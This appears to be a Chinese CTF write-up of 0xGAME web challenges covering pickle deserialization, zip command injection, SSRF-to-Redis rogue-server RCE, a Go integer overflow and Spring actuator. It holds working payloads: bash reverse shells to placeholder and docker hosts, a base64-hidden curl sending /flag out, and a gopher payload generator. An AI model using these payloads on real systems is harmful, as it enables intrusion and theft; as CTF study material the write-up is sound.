+<p>首先, 如果你使用 <code>pickle.dumps()</code> 来生成 payload, 那么你得知道不同操作系统生成的 pickle 序列化数据是有区别的</p>
+<p>参考: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p>
+<div class="code-wrapper"><pre><code class="hljs taggerscript"># Linux (注意 posix) b&#x27;cposix<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>tp2<span class="hljs-symbol">\n</span>Rp3<span class="hljs-symbol">\n</span>.&#x27; # Windows (注意 nt) b&#x27;cnt<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>tp2<span class="hljs-symbol">\n</span>Rp3<span class="hljs-symbol">\n</span>.&#x27;</code></pre></div>
+
+<p>在 Windows 上生成的 pickle payload 无法在 Linux 上运行</p>
+<p>当然如果手动去构造 opcode, 那是没有这个问题的, 比如这段 opcode</p>
+<div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;cos system (S&#x27;whoami&#x27; tR.&#x27;&#x27;&#x27;</span></code></pre></div>
+
+<p>其次, 很多人过来问为什么构造了恶意 pickle 序列化数据发送之后服务器报错 500, 其实这个是正常现象, 没啥问题</p>
+<p>上面代码在 <code>pickle.loads()</code> 之后得到 note 对象, 然后访问它的 id, name, content 属性, 即 <code>note.id</code>, <code>note.name</code>, <code>note.content</code></p>
+<p>如果是正常的 pickle 数据, 那么服务器就会显示正常的 note 内容</p>
+<p>如果是恶意的 pickle 数据, 那么 <code>pickle.loads()</code> 返回的就是通过 <code>__reduce__</code> 方法调用的某个函数所返回的结果, 根本就没有 id, name, content 这些属性, 当然就会报错了</p>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:
+  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
+    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>, (<span class="hljs-string">&quot;123&quot;</span>, ))
+  
+s = pickle.dumps(A(), protocol=<span class="hljs-number">0</span>)
+obj = pickle.loads(s)
+<span class="hljs-built_in">print</span>(obj) <span class="hljs-comment"># 123</span></code></pre></div>
+
+<p>换成 <code>os.system()</code> 同理, 在 Linux 中通过这个函数执行的命令, 如果执行成功, 则返回 0, 否则返回非 0 值</p>
+<p>虽然服务器会报错 500, 但命令其实还是执行成功的</p>
+<p>然后, 也有一部分人问为什么没有回显? 为什么反弹 shell 失败?</p>
+<p>首先为什么没有回显我上面已经说了, 而且就算 <code>os.system()</code> 有回显你也看不到, 因为回显的内容根本就不会在网页上输出</p>
+<p>至于为什么反弹 shell 失败, 提示 <code>sh: 1: Syntax error: Bad fd number.</code>, 很多人用的都是这个命令</p>
+<div class="code-wrapper"><pre><code class="hljs awk">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/host.docker.internal/</span><span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></code></pre></div>
+
+<p>这个命令存在一些注意点, 首先得理解 bash 反弹 shell 的本质</p>
+<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/08/05/Linux">https://www.k0rz3n.com/2018/08/05/Linux</a>反弹shell（一）文件描述符与重定向&#x2F;</p>
+<p>[<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/]">https://www.k0rz3n.com/2018/08/05/Linux反弹shell（二）反弹shell的本质/]</a>(<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/08/05/Linux">https://www.k0rz3n.com/2018/08/05/Linux</a> 反弹shell （二）反弹shell的本质&#x2F;)</p>
+<p>然后你得知道上面这个反弹 shell 的语法其实是 bash 自身的特性, 而其它 shell 例如 sh, zsh 并不支持这个功能</p>
+<p>对于题目的环境而言, 当你执行这条命令的时候, 它实际上是在 sh 的 context 中执行的, <code>&gt;&amp;</code> 以及 <code>/dev/tcp/IP/Port</code> 会被 sh 解析, 而不是 bash, 因此会报错</p>
+<p>解决方法也很简单, 将上面的命令使用 <code>bash -c &quot;&quot;</code> 包裹起来, 即</p>
+<div class="code-wrapper"><pre><code class="hljs llvm">bash -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/host.docker.internal/4444 0&gt;&amp;1&quot;</span></code></pre></div>
+
+<p>让 <code>&gt;&amp;</code> 以及 <code>/dev/tcp/IP/Port</code> 都被 bash 解析, 就能反弹成功了</p>
+</blockquote>
+<p>说的很好，提到的pickle部分在学习中都有了解到</p>
+<p>说一下自己sb的地方，我直接拿CNSS的payload去打，但是我忘了那是在URL中输入的，进行了url编码，这里换行直接用<code>\n</code>就行</p>
+<div class="code-wrapper"><pre><code class="hljs 1c">b&#x27;(S\&#x27;bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/7777 0&gt;&amp;1&quot;</span>\&#x27;\nios\nsystem\n.&#x27;</code></pre></div>
+
+
+
+<div class="code-wrapper"><pre><code class="hljs csp">flask-unsign --sign --cookie &quot;&#123;<span class="hljs-string">&#x27;notes&#x27;</span>: &#123;<span class="hljs-string">&#x27;evil&#x27;</span>: b<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;cos\nsystem\n(S&#x27;</span>bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xx.xxx.xx.xx/4444 0&gt;&amp;1\&quot;<span class="hljs-string">&#x27;\ntR.&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;&quot; --secret 6061 --no-literal-eval</code></pre></div>
+
+<p>要加上<code>--no-literal-eval</code>，不然生成结果不一样</p>
+<p>并且上面说到反弹shell说的很好，一定要加上<code>bash -c</code>，直接<code>bash -i</code>是不行的，但我在CNSS是可以直接<code>bash -i</code>的，现在想来应该是CNSS恰好用的是<code>bash</code>，而该题目应该用的是其他<code>shell</code>，要加上<code>bash -c</code>让他被bash解析</p>
+<p>再说明一下，要在linux环境下运行才可以（当然出题人的mac也行），</p>
+<p>windows下是无法使用\进行转义的</p>
+<p>在 Windows 的 cmd 中，如果你已经使用了双引号括起整个字符串，而字符串内部又需要包含双引号，可以<strong>使用两个双引号来表示一个双引号</strong>。这是 Windows 命令行的规则。</p>
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122111735938.png" srcset="/img/loading.gif" lazyload alt="image-20231122111735938"></p>
+<h2 id="RSS-parser"><a href="#RSS-parser" class="headerlink" title="RSS parser"></a>RSS parser</h2><p>搜一下就知道RSS语法与xml有关，于是想到XXE漏洞</p>
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122123119964.png" srcset="/img/loading.gif" lazyload alt="image-20231122123119964"></p>
+<p>无法直接读取&#x2F;flag，随便输入以http或https开头的url，能看到是flask的debug页面</p>
+<p>于是算pin码</p>
+<p>但这里奇怪的是wp中说&#x2F;etc&#x2F;machine-id是没有值的，但我用docker启动题目是可以读取到值的</p>
+<p>不说了，没一次是算对的</p>
+<h2 id="zip-manager"><a href="#zip-manager" class="headerlink" title="zip_manager"></a>zip_manager</h2><p>服了，题目给的docker启动了，访问不了，挺想做的</p>
+<p>题目实现了在线解压缩 zip 文件的功能, 但是不能进行目录穿越</p>
+<div class="code-wrapper"><pre><code class="hljs python">os.system(<span class="hljs-string">&#x27;unzip -o &#123;&#125; -d &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(zip_path, dest_path))</code></pre></div>
+
+<p>可以有两种方法：zip 软链接和命令注入</p>
+<p>unzip -o 很明显能够使用软链接         2023国赛也出过</p>
+<div class="code-wrapper"><pre><code class="hljs stata">ln -s / <span class="hljs-keyword">test</span> 
+<span class="hljs-keyword">zip</span> -y <span class="hljs-keyword">test</span>.<span class="hljs-keyword">zip</span> <span class="hljs-keyword">test</span></code></pre></div>
+
+<p>上传后访问 <code>http://127.0.0.1:50033/test/test/</code></p>
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122132634217.png" srcset="/img/loading.gif" lazyload alt="image-20231122132634217"></p>
+<p>然后使用os.system也很明显，<code>;</code>绕过，文件名处命令执行，要以<code>.zip</code>结尾</p>
+<div class="code-wrapper"><pre><code class="hljs bash">test.zip;<span class="hljs-built_in">echo</span> Y3VybCBob3N0LmRvY2tlci5pbnRlcm5hbDo0NDQ0IC1UIC9mbGFnCg==|<span class="hljs-built_in">base64</span> -d|bash;1.zip</code></pre></div>
+
+<h2 id="web-snapshot"><a href="#web-snapshot" class="headerlink" title="web_snapshot"></a>web_snapshot</h2><p>ssrf打redis，虽然知道主从复制，但是确实不会操作，算是保存脚本吧，学到了</p>
+<p>限制输入的 url 只能以 http &#x2F; https 开头</p>
+<p>注意 <code>curl_setopt</code> 设置的参数 <code>CURLOPT_FOLLOWLOCATION</code>, 代表允许 curl 根据返回头中的 Location 进行重定向</p>
+<p>而 curl 支持 dict &#x2F; gopher 等协议, 那么我们就可以通过 Location 头把协议从 http 重定向至 dict &#x2F; gopher, 这个技巧在一些关于 ssrf 的文章里面也会提到</p>
+<p>结合 redis 的知识点, 可以尝试 redis 主从复制 rce</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p>
+<div class="code-wrapper"><pre><code class="hljs python">//生成gopher协议脚本
+
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> re
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">urlencode</span>(<span class="hljs-params">data</span>):
+    enc_data = <span class="hljs-string">&#x27;&#x27;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:
+        h = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)
+        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(h) == <span class="hljs-number">1</span>:
+            enc_data += <span class="hljs-string">&#x27;%0&#x27;</span> + h.upper()
+        <span class="hljs-keyword">else</span>:
+            enc_data += <span class="hljs-string">&#x27;%&#x27;</span> + h.upper()
+    <span class="hljs-keyword">return</span> enc_data
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_payload</span>(<span class="hljs-params">payload</span>):
+
+    redis_payload = <span class="hljs-string">&#x27;&#x27;</span>
+
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload.split(<span class="hljs-string">&#x27;\n&#x27;</span>):
+        arg_num = <span class="hljs-string">&#x27;*&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(i.split(<span class="hljs-string">&#x27; &#x27;</span>)))
+        redis_payload += arg_num + <span class="hljs-string">&#x27;\r\n&#x27;</span>
+        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.split(<span class="hljs-string">&#x27; &#x27;</span>):
+            arg_len = <span class="hljs-string">&#x27;$&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(j))
+            redis_payload += arg_len + <span class="hljs-string">&#x27;\r\n&#x27;</span>
+            redis_payload += j + <span class="hljs-string">&#x27;\r\n&#x27;</span>
+
+    gopher_payload = <span class="hljs-string">&#x27;gopher://db:6379/_&#x27;</span> + urlencode(redis_payload)
+    <span class="hljs-keyword">return</span> gopher_payload
+
+payload1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-string">slaveof vps_ip 21000     //vps上启动的redis-rogue-server的端口</span>
+<span class="hljs-string">config set dir /tmp</span>
+<span class="hljs-string">config set dbfilename exp.so</span>
+<span class="hljs-string">quit</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+
+payload2 = <span class="hljs-string">&#x27;&#x27;&#x27;slaveof no one</span>
+<span class="hljs-string">module load /tmp/exp.so</span>
+<span class="hljs-string">system.exec &#x27;env&#x27;</span>
+<span class="hljs-string">quit</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+
+<span class="hljs-built_in">print</span>(gen_payload(payload1))
+<span class="hljs-built_in">print</span>(gen_payload(payload2))</code></pre></div>
+
+<p>利用php代码 从 http 重定向至 dict &#x2F; gopher</p>
+<p>分两次打</p>
+<div class="code-wrapper"><pre><code class="hljs llvm">&lt;?php
+
+// step <span class="hljs-number">1</span>
+header(&#x27;Location: gopher://db:<span class="hljs-number">6379</span>/_<span class="hljs-variable">%2</span>A<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%37</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%73</span><span class="hljs-variable">%6</span>C<span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%66</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>E<span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>B<span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>E<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>E<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>E<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>C<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%35</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%32</span><span class="hljs-variable">%31</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%36</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%6</span>E<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%64</span><span class="hljs-variable">%69</span><span class="hljs-variable">%72</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>D<span class="hljs-variable">%70</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%36</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%6</span>E<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%31</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>C<span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>E<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>D<span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%36</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%70</span><span class="hljs-variable">%2</span>E<span class="hljs-variable">%73</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%69</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A&#x27;)<span class="hljs-comment">;</span>
+<span class="hljs-comment"></span>
+// step <span class="hljs-number">2</span>
+// header(&#x27;Location: gopher://db:<span class="hljs-number">6379</span>/_<span class="hljs-variable">%2</span>A<span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%37</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%73</span><span class="hljs-variable">%6</span>C<span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%66</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%32</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%6</span>E<span class="hljs-variable">%6</span>F<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%6</span>F<span class="hljs-variable">%6</span>E<span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%36</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%6</span>D<span class="hljs-variable">%6</span>F<span class="hljs-variable">%64</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>C<span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%6</span>C<span class="hljs-variable">%6</span>F<span class="hljs-variable">%61</span><span class="hljs-variable">%64</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%31</span><span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>D<span class="hljs-variable">%70</span><span class="hljs-variable">%2</span>F<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%70</span><span class="hljs-variable">%2</span>E<span class="hljs-variable">%73</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%32</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%31</span><span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%73</span><span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>D<span class="hljs-variable">%2</span>E<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%35</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%27</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>E<span class="hljs-variable">%76</span><span class="hljs-variable">%27</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%69</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A&#x27;)<span class="hljs-comment">;</span></code></pre></div>
+
+<p>在 vps 上启动 <code>php -S 0.0.0.0:65000</code>（跟python启动http.server差不多）, 然后让题目去访问这个 php 文件</p>
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122153720563.png" srcset="/img/loading.gif" lazyload alt="image-20231122153720563"></p>
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122153647044.png" srcset="/img/loading.gif" lazyload alt="image-20231122153647044"></p>
+<p>第二次打完之后, 访问给出的 link 拿到回显</p>
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122153822385.png" srcset="/img/loading.gif" lazyload alt="image-20231122153822385"></p>
+<blockquote>
+<p>wp提醒的几个点</p>
+<p>首先 gopher 得分两次打, 不然你在执行 <code>slaveof IP Port</code> 命令之后又立即执行了 <code>slave of no one</code>, 这就导致根本没有时间去主从复制 exp.so</p>
+<p>其次在使用 gopher 发送 redis 命令的时候记得结尾加上 <code>quit</code>, 不然会一直卡住</p>
+<p>然后注意 redis 的主机名是 <code>db</code>, 而不是 <code>127.0.0.1</code>, 因此访问 redis 数据库得用 <code>db:6379</code></p>
+<p>如果用 dict 协议打的话, 得调整一下 payload 顺序</p>
+<div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/config</span><span class="hljs-symbol">:set</span><span class="hljs-symbol">:dir</span><span class="hljs-symbol">:/tmp</span> <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/config</span><span class="hljs-symbol">:set</span><span class="hljs-symbol">:dbfilename</span><span class="hljs-symbol">:exp</span>.so <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/slaveof</span><span class="hljs-symbol">:host</span>.docker.<span class="hljs-symbol">internal:</span><span class="hljs-number">21000</span> <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/module</span><span class="hljs-symbol">:load</span><span class="hljs-symbol">:/tmp/exp</span>.so <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/slave</span><span class="hljs-symbol">:no</span><span class="hljs-symbol">:one</span> <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/system</span>.<span class="hljs-symbol">exec:</span>env <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/module</span><span class="hljs-symbol">:unload</span><span class="hljs-symbol">:system</span></code></pre></div>
+
+<p>因为每次执行命令之间会存在一定的时间间隔, 所以得先设置 dir 和 dbfilename, 然后再 slaveof, 不然最终同步的文件名和路径还是原来的 <code>/data/dump.rdb</code></p>
+</blockquote>
+<h2 id="go-shop"><a href="#go-shop" class="headerlink" title="go shop"></a>go shop</h2><p>题目是一个商店, 初始 money 为 100, 需要购买金额为 999999999 的 flag 商品后才能拿到 flag</p>
+<p>往 number 里面填负数或者小数这种思路都是不行的, 需要仔细看代码的逻辑</p>
+<div class="code-wrapper"><pre><code class="hljs go">n, _ := strconv.Atoi(data[<span class="hljs-string">&quot;num&quot;</span>].(<span class="hljs-type">string</span>))
+
+<span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">0</span> &#123;
+    c.JSON(<span class="hljs-number">200</span>, gin.H&#123;
+        <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Product num can&#x27;t be negative&quot;</span>,
+    &#125;)
+    <span class="hljs-keyword">return</span>
+&#125;
+
+<span class="hljs-keyword">if</span> user.Money &gt;= product.Price*<span class="hljs-type">int64</span>(n) &#123;
+    user.Money -= product.Price * <span class="hljs-type">int64</span>(n)
+    user.Items[product.Name] += <span class="hljs-type">int64</span>(n)
+    c.JSON(<span class="hljs-number">200</span>, gin.H&#123;
+        <span class="hljs-string">&quot;message&quot;</span>: fmt.Sprintf(<span class="hljs-string">&quot;Buy %v * %v success&quot;</span>, product.Name, n),
+    &#125;)</code></pre></div>
+
+<blockquote>
+<p>Go 语言是强类型语言, 包含多种数据类型, 以数字类型为例, 存在 uint8 uint16 uint32 uint64 (无符号整型) 和 int8 int16 int32 int64 (有符号整型) 等类型</p>
+<p>Go 语言在编译期会检查源码中定义的变量是否存在溢出, 例如 <code>var i uint8 = 99999</code> 会使得编译不通过, 但是并不会检查变量的运算过程中是否存在溢出, 例如 <code>var i uint8 = a * b</code>, 如果程序没有对变量的取值范围做限制, 那么在部分场景下就可能存在整数溢出漏洞</p>
+<p>上面的 BuyHandler 虽然限制了 n 不能为负数, 但是并没有限制 n 的最大值</p>
+<p>因此我们可以控制 n, 使得 <code>product.Price * int64(n)</code> 溢出为一个负数, 之后进行 <code>user.Money -= product.Price * int64(n)</code> 运算的时候, 当前用户的 money 就会增加, 最终达到一个可以购买 flag 商品的金额, 从而拿到 flag</p>
+<p>查阅相关文档可以知道 int64 类型的范围是 <code>-9223372036854775808 ~ 9223372036854775807</code></p>
+<p>经过简单的计算或者瞎猜, 可以购买数量为 <code>922337203695477808</code> 的 apple</p>
+</blockquote>
+<p>就是让<code>product.Price*int64(n)</code>的结果产生溢出，变为负数通过判断，并且变为负数money也会不断增加</p>
+<p>也可以直接让<code>n</code>产生溢出，这样money会加的很少，但数量会变得很大，然后卖掉即可</p>
+<h1 id="第四周-（java安全专题，但与gadget无关）"><a href="#第四周-（java安全专题，但与gadget无关）" class="headerlink" title="第四周 （java安全专题，但与gadget无关）"></a>第四周 （java安全专题，但与gadget无关）</h1><p>因为一直在学java，没怎么做过题目，所以看到是专题时挺感兴趣的</p>
+<h2 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h2><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122181651148.png" srcset="/img/loading.gif" lazyload alt="image-20231122181651148"></p>
+<p>考察spring actuator，<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9763#toc-12">https://xz.aliyun.com/t/9763#toc-12</a></p>
+<p><code>/actuator/env</code> 可以发现 app.username 和 app.password 这两个环境变量</p>
+<p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122181847546.png" srcset="/img/loading.gif" lazyload alt="image-20231122181847546"></p>
